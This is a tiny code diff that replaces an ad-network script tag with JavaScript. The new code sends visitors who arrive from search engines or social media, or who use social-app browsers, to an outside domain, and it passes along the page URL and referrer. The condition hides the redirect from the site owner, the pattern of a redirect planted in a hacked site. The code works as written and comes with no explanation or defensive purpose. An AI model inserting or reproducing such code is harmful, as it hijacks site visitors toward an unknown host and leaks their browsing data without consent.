@@ -1,1 +1,2 @@
-src='//pl15746481.bestcpmnetwork.com/82/a9/e7/82a9e7600b786d799fe064dba95aae9b.js'
+var ars = 'https://battleofbrokenhill.com';
+if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
